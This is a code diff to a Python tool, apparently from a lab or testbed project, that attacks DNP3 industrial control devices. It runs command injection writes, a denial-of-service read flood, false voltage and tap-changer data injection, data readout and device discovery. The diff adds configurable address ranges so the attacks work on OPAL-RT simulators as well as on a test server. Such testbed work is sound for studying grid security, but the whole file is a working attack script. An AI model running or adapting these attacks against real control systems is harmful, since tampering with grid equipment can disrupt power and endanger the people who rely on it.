@@ -9,7 +9,7 @@ This tool wraps the existing DNP3Attack class to run attacks directly using the
 DNP3Client without the WateringHoleAttack dependencies.
 
 Usage:
-    python3 standalone_dnp3_attack.py --target <IP> --attack <attack_type>
+    python3 standalone_dnp3_attack.py --target <IP> --attack <attack_type> [address options]
 
 Attack Types:
     - command_injection: Execute command injection attack sequence
@@ -19,11 +19,29 @@ Attack Types:
     - all: Execute all attack types sequentially
     - discover: Discover DNP3 devices on the network
 
+Address Configuration:
+    By default, addresses are configured for the test server (1000-3000 range).
+    For OPAL-RT systems with addresses 0-35, use the address configuration flags.
+
 Examples:
+    # Attack test server with default addresses (1000-3000 range)
     python3 standalone_dnp3_attack.py --target 192.168.1.100 --attack command_injection
-    python3 standalone_dnp3_attack.py --discover --attack dos  # Discover then attack first device
-    python3 standalone_dnp3_attack.py --target 10.0.0.50 --attack all
-    python3 standalone_dnp3_attack.py --discover-only  # Just discover devices
+
+    # Attack OPAL-RT with addresses 0-35
+    python3 standalone_dnp3_attack.py --target 192.168.1.50 --attack exfiltration \\
+        --analog-start 0 --analog-count 36 \\
+        --binary-start 0 --binary-count 36 \\
+        --counter-start 0 --counter-count 36
+
+    # Discover devices then attack
+    python3 standalone_dnp3_attack.py --discover --attack dos --analog-start 0 --analog-count 36
+
+    # Just discover devices
+    python3 standalone_dnp3_attack.py --discover-only
+
+    # Run all attacks against OPAL-RT
+    python3 standalone_dnp3_attack.py --target 10.0.0.50 --attack all \\
+        --analog-start 0 --analog-count 36 --binary-start 0 --binary-count 36
 """
 
 # --- FORCE LOGGING SETUP AT TOP ---
@@ -49,10 +67,59 @@ else:
 import argparse
 import random
 import time
+from dataclasses import dataclass
 from typing import Optional, List, Dict, Any
 
 from controller.dnp3.DNP3Attack import DNP3DataPoint, DNP3Constants
 from controller.dnp3.dnp3_client import DNP3Client
+
+
+@dataclass
+class AddressConfig:
+    """
+    Configuration for DNP3 address ranges to support different outstation configurations.
+
+    Defaults match the original hardcoded values for backward compatibility with test server.
+    For OPAL-RT, use: analog_start=0, analog_count=36, binary_start=0, binary_count=36
+    """
+
+    analog_start: int = 1000
+    analog_count: int = 2001  # Covers 1000-3000 range
+    binary_start: int = 2000
+    binary_count: int = 1000
+    counter_start: int = 3000
+    counter_count: int = 1000
+
+    def get_analog_address(self, offset: int = 0) -> int:
+        """Get analog address with bounds checking."""
+        addr = self.analog_start + offset
+        if addr >= self.analog_start + self.analog_count:
+            logger.warning(
+                f"Analog address {addr} exceeds configured range, using {self.analog_start}"
+            )
+            return self.analog_start
+        return addr
+
+    def get_binary_address(self, offset: int = 0) -> int:
+        """Get binary address with bounds checking."""
+        addr = self.binary_start + offset
+        if addr >= self.binary_start + self.binary_count:
+            logger.warning(
+                f"Binary address {addr} exceeds configured range, using {self.binary_start}"
+            )
+            return self.binary_start
+        return addr
+
+    def get_counter_address(self, offset: int = 0) -> int:
+        """Get counter address with bounds checking."""
+        addr = self.counter_start + offset
+        if addr >= self.counter_start + self.counter_count:
+            logger.warning(
+                f"Counter address {addr} exceeds configured range, using {self.counter_start}"
+            )
+            return self.counter_start
+        return addr
+
 
 # Configure logging
 logging.basicConfig(
@@ -77,6 +144,7 @@ class StandaloneDNP3Attack:
         target_host: Optional[str] = None,
         target_port: int = 20000,
         use_discovery: bool = False,
+        address_config: Optional[AddressConfig] = None,
     ):
         """
         Initialize the standalone DNP3 attack.
@@ -85,15 +153,23 @@ class StandaloneDNP3Attack:
             target_host: Target DNP3 device IP address (optional if using discovery)
             target_port: Target DNP3 port (default 20000)
             use_discovery: Whether to use device discovery
+            address_config: Address configuration for target device (default: legacy addresses)
         """
         self.target_host = target_host
         self.target_port = target_port
         self.use_discovery = use_discovery
         self.discovered_devices: List[Dict[str, Any]] = []
+        self.address_config = address_config or AddressConfig()
 
         if target_host:
             self.client = DNP3Client(host=target_host, port=target_port)
             logger.info(f"Initialized DNP3 attack against {target_host}:{target_port}")
+            logger.info(
+                f"Address config: analog={self.address_config.analog_start}-"
+                f"{self.address_config.analog_start + self.address_config.analog_count - 1}, "
+                f"binary={self.address_config.binary_start}-"
+                f"{self.address_config.binary_start + self.address_config.binary_count - 1}"
+            )
         else:
             # Initialize client without target for discovery mode
             self.client = DNP3Client(port=target_port)
@@ -198,11 +274,15 @@ class StandaloneDNP3Attack:
         """Execute command injection attack sequence."""
         logger.info("Starting command injection attack")
         try:
+            # Use configurable addresses instead of hardcoded values
+            control_addr = self.address_config.get_analog_address(0)
+            retry_addr = self.address_config.get_analog_address(3)
+
             # Initial control sequence
             self._execute_dnp3_sequence(
                 action="WRITE_ANALOG",
-                address=2000,
-                number=3,
+                address=control_addr,
+                number=min(3, self.address_config.analog_count),
                 data_points="1,1,0",
                 sequence_name="Initial control",
             )
@@ -211,8 +291,8 @@ class StandaloneDNP3Attack:
             for i in range(DNP3Constants.MAX_RETRIES):
                 self._execute_dnp3_sequence(
                     action="WRITE_ANALOG",
-                    address=3000,
-                    number=5,
+                    address=retry_addr,
+                    number=min(5, self.address_config.analog_count - 3),
                     data_points="1,0,1,0,1",
                     sequence_name=f"Retry sequence {i+1}",
                 )
@@ -221,8 +301,8 @@ class StandaloneDNP3Attack:
             # Verification sequence
             self._execute_dnp3_sequence(
                 action="READ_ANALOG",
-                address=2000,
-                number=3,
+                address=control_addr,
+                number=min(3, self.address_config.analog_count),
                 sequence_name="Status verification",
             )
 
@@ -236,12 +316,15 @@ class StandaloneDNP3Attack:
         """Execute DoS attack sequence."""
         logger.info("Starting denial of service attack")
         try:
-            # Analog flood
+            # Analog flood - use configured address range
+            analog_addr = self.address_config.get_analog_address(0)
+            analog_count = self.address_config.analog_count
+
             logger.info("Starting analog input flood")
             for i in range(DNP3Constants.FLOOD_ITERATIONS):
                 try:
                     self._execute_dnp3_command(
-                        action="READ_ANALOG", address=0, number=DNP3Constants.MAX_POINTS
+                        action="READ_ANALOG", address=analog_addr, number=analog_count
                     )
                     if i % 50 == 0:
                         logger.info(
@@ -250,12 +333,15 @@ class StandaloneDNP3Attack:
                 except Exception as e:
                     logger.error(f"Analog flood error at {i+1}: {str(e)}")
 
-            # Binary flood
+            # Binary flood - use configured address range
+            binary_addr = self.address_config.get_binary_address(0)
+            binary_count = self.address_config.binary_count
+
             logger.info("Starting binary input flood")
             for i in range(DNP3Constants.FLOOD_ITERATIONS):
                 try:
                     self._execute_dnp3_command(
-                        action="READ_BINARY", address=0, number=DNP3Constants.MAX_POINTS
+                        action="READ_BINARY", address=binary_addr, number=binary_count
                     )
                     if i % 50 == 0:
                         logger.info(
@@ -267,7 +353,7 @@ class StandaloneDNP3Attack:
             # Check target status
             self._execute_dnp3_sequence(
                 action="READ_ANALOG",
-                address=DNP3Constants.STATUS_ADDRESS,
+                address=analog_addr,
                 number=1,
                 sequence_name="Status check",
             )
@@ -282,11 +368,15 @@ class StandaloneDNP3Attack:
         """Execute false data injection attack sequence."""
         logger.info("Starting false data injection attack")
         try:
+            # Use configurable addresses
+            voltage_addr = self.address_config.get_analog_address(0)
+            tap_addr = self.address_config.get_binary_address(0)
+
             # Voltage control
             self._execute_dnp3_sequence(
                 action="WRITE_ANALOG",
-                address=DNP3Constants.VOLTAGE_ADDRESS,
-                number=5,
+                address=voltage_addr,
+                number=min(5, self.address_config.analog_count),
                 data_points="13000,12800,12500,12200,12000",
                 sequence_name="Voltage control write",
             )
@@ -294,8 +384,8 @@ class StandaloneDNP3Attack:
             # Direct operate
             self._execute_dnp3_sequence(
                 action="WRITE_ANALOG",  # Using WRITE_ANALOG as DIRECT_OPERATE maps to it
-                address=DNP3Constants.VOLTAGE_ADDRESS,
-                number=5,
+                address=voltage_addr,
+                number=min(5, self.address_config.analog_count),
                 data_points="13000,12800,12500,12200,12000",
                 sequence_name="Voltage direct operate",
             )
@@ -303,8 +393,8 @@ class StandaloneDNP3Attack:
             # Tap control
             self._execute_dnp3_sequence(
                 action="WRITE_BINARY",
-                address=DNP3Constants.TAP_ADDRESS,
-                number=3,
+                address=tap_addr,
+                number=min(3, self.address_config.binary_count),
                 data_points="1,0,1",
                 sequence_name="Tap control",
             )
@@ -319,26 +409,31 @@ class StandaloneDNP3Attack:
         """Execute information exfiltration attack sequence."""
         logger.info("Starting information exfiltration attack")
         try:
+            # Use configurable addresses for exfiltration
+            analog_addr = self.address_config.get_analog_address(0)
+            binary_addr = self.address_config.get_binary_address(0)
+            counter_addr = self.address_config.get_counter_address(0)
+
             data_points = [
                 DNP3DataPoint(
                     group=DNP3Constants.ANALOG_INPUTS,
                     variation=1,
-                    start=1000,
-                    count=10,
+                    start=analog_addr,
+                    count=min(10, self.address_config.analog_count),
                     description="Analog measurements",
                 ),
                 DNP3DataPoint(
                     group=DNP3Constants.BINARY_INPUTS,
                     variation=2,
-                    start=2000,
-                    count=16,
+                    start=binary_addr,
+                    count=min(16, self.address_config.binary_count),
                     description="Binary status",
                 ),
                 DNP3DataPoint(
                     group=DNP3Constants.COUNTER_INPUTS,
                     variation=1,
-                    start=3000,
-                    count=8,
+                    start=counter_addr,
+                    count=min(8, self.address_config.counter_count),
                     description="Counter values",
                 ),
             ]
@@ -471,6 +566,49 @@ Examples:
         "--verbose", "-v", action="store_true", help="Enable verbose logging"
     )
 
+    # Address configuration arguments for OPAL-RT compatibility
+    parser.add_argument(
+        "--analog-start",
+        type=int,
+        default=1000,
+        help="Starting address for analog inputs/outputs (default: 1000 for test server, use 0 for OPAL-RT)",
+    )
+
+    parser.add_argument(
+        "--analog-count",
+        type=int,
+        default=2001,
+        help="Number of analog addresses available (default: 2001 for test server, use 36 for OPAL-RT)",
+    )
+
+    parser.add_argument(
+        "--binary-start",
+        type=int,
+        default=2000,
+        help="Starting address for binary inputs/outputs (default: 2000 for test server, use 0 for OPAL-RT)",
+    )
+
+    parser.add_argument(
+        "--binary-count",
+        type=int,
+        default=1000,
+        help="Number of binary addresses available (default: 1000 for test server, use 36 for OPAL-RT)",
+    )
+
+    parser.add_argument(
+        "--counter-start",
+        type=int,
+        default=3000,
+        help="Starting address for counter inputs (default: 3000 for test server, use 0 for OPAL-RT)",
+    )
+
+    parser.add_argument(
+        "--counter-count",
+        type=int,
+        default=1000,
+        help="Number of counter addresses available (default: 1000 for test server, use 8 for OPAL-RT)",
+    )
+
     args = parser.parse_args()
 
     if args.verbose:
@@ -484,10 +622,23 @@ Examples:
         parser.error("Either --target or --discover/--discover-only must be specified")
 
     try:
+        # Create address configuration from CLI arguments
+        address_config = AddressConfig(
+            analog_start=args.analog_start,
+            analog_count=args.analog_count,
+            binary_start=args.binary_start,
+            binary_count=args.binary_count,
+            counter_start=args.counter_start,
+            counter_count=args.counter_count,
+        )
+
         # Initialize the attack
         use_discovery = args.discover or args.discover_only
         attack = StandaloneDNP3Attack(
-            args.target, args.port, use_discovery=use_discovery
+            args.target,
+            args.port,
+            use_discovery=use_discovery,
+            address_config=address_config,
         )
 
         # Handle discovery-only mode
